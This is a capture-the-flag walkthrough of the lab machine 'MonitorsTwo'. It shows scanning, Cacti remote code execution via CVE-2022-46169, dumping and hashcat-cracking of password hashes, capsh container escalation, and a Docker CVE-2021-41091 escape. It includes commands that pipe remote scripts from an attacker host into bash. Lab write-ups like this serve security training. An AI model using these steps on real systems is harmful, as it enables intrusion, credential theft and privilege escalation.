---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# MonitorsTwo

## Enumeration

### Nmap

`map -sV 10.10.11.211`

```
tarting Nmap 7.93 ( https://nmap.org ) at 2023-08-05 04:56 EDT
Nmap scan report for 10.10.11.211
Host is up (0.082s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds
```

### Gobuster

`gobuster dir -u 10.10.11.211 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.211
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/05 05:01:28 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 314] [--> http://10.10.11.211/images/]
/docs                 (Status: 301) [Size: 312] [--> http://10.10.11.211/docs/]
/scripts              (Status: 301) [Size: 315] [--> http://10.10.11.211/scripts/]
/service              (Status: 301) [Size: 315] [--> http://10.10.11.211/service/]
/plugins              (Status: 301) [Size: 315] [--> http://10.10.11.211/plugins/]
/log                  (Status: 403) [Size: 276]
/install              (Status: 301) [Size: 315] [--> http://10.10.11.211/install/]
/lib                  (Status: 301) [Size: 311] [--> http://10.10.11.211/lib/]
/resource             (Status: 301) [Size: 316] [--> http://10.10.11.211/resource/]
/cache                (Status: 301) [Size: 313] [--> http://10.10.11.211/cache/]
/include              (Status: 301) [Size: 315] [--> http://10.10.11.211/include/]
/LICENSE              (Status: 200) [Size: 15171]
/formats              (Status: 301) [Size: 315] [--> http://10.10.11.211/formats/]
/CHANGELOG            (Status: 200) [Size: 254887]
/locales              (Status: 301) [Size: 315] [--> http://10.10.11.211/locales/]
/cli                  (Status: 403) [Size: 276]
/mibs                 (Status: 301) [Size: 312] [--> http://10.10.11.211/mibs/]
/server-status        (Status: 403) [Size: 276]
Progress: 220463 / 220561 (99.96%)
===============================================================
2023/08/05 05:16:05 Finished
===============================================================
```

### Web

It is a Cacti ....which is open source monitoring tool.

It is vulnerable. Remote code execution

CVE-2022-46169 https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit

With that, I am able to get www-data shell And that is a **container**... because there is an `entrypoint.sh` Reading it, I can see creds to database.

```
...
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti < /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi
...
```

### Database

`select * from user_auth` Contains passwords.

```
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name      | email_address          | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC |     0 | Jamie Thompson | admin@monitorstwo.htb  |                      | on              | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   663348655 |
|  3 | guest    | 43e9a4ab75570f5b                                             |     0 | Guest Account  |                        | on                   | on              | on        | on        | on           | 3              |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |           0 |
|  4 | marcus   | $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C |     0 | Marcus Brune   | marcus@monitorstwo.htb |                      |                 | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  | on     |               0 |        0 |  2135691668 |
+----+----------+--------------------------------------------------------------+-------+----------------+------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
```

Anyway. There is also a seed file. `/var/www/html/cacti.sql` There are:

```
INSERT INTO user_auth VALUES (1,'admin','21232f297a57a5a743894a0e4a801fc3',0,'Administrator','','on','on','on','on','on','on',2,1,1,1,1,'on',-1,-1,'-1','',0,0,0);
INSERT INTO user_auth VALUES (3,'guest','43e9a4ab75570f5b',0,'Guest Account','','on','on','on','on','on',3,1,1,1,1,1,'',-1,-1,'-1','',0,0,0);
```

Given that password reset is turned off....

### Passwords

CyberChef hints that it is MD5 `hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt` `-m 0` is MD5 21232f297a57a5a743894a0e4a801fc3:admin But that dosen't fit with the MySQL...

Lets try Guest account.... `hashcat -m 200 -a 0  hash.txt /usr/share/wordlists/rockyou.txt` `-m 200` is MySQL323 43e9a4ab75570f5b:admin Which also does not work... HMM

Ok, last one is marcus... `hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt` `-m 200` is MySQL323 $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey

Yes! That's our user `marcus:funkymonkey`

## -> Root

### Host enumeration

#### Linpeas

`curl 10.10.16.20:8888/linpeas.sh | /bin/bash`

#### Pspycd

```
curl 10.10.16.20:8888/pspy64 > pspy64
chmod +x pspy64
```

That is a wrong way. I need to get back to the container. And try to escape from it!

### Vulnerability

There is a vulnerable docker version

```
Docker version 20.10.5+dfsg1, build 55c4c88
```

For that there is an exploit which requires root in container https://github.com/UncleJ4ck/CVE-2021-41091/tree/main

#### Container escalation

List SUIDs `find / -perm -u=s -type f 2>/dev/null` finds `/sbin/capsh`

https://gtfobins.github.io/gtfobins/capsh/ `capsh --gid=0 --uid=0 --` gives root in rootles container

### Exploit

First I need to set up suid on `/bin/bash` inside the container

```
chmod u+s /bin/bash
```

Run expolit on host

```
curl 10.10.16.20:8888/exp.sh
chmod +x exp.sh
./exp.sh
```

```
...
[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[>] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'
```

So go to that path, spawn shell and you are root